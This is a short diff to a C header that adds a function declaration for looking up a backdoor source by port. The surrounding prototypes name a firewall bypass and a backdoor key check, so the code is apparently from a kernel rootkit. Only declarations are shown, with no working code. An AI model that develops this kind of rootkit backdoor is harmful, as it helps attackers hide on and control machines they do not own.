@@ -131,6 +131,7 @@ void kv_sock_stop_fw_bypass(void);
 struct kv_crypto_st *kv_sock_get_mgc(void);
 #endif
 bool kv_bd_search_iph_source(__be32 saddr);
+bool kv_bd_search_iph_source_by_port(int sport);
 bool kv_check_bdkey(struct tcphdr *, struct sk_buff *);
 void kv_bd_cleanup_item(__be32 *);
 
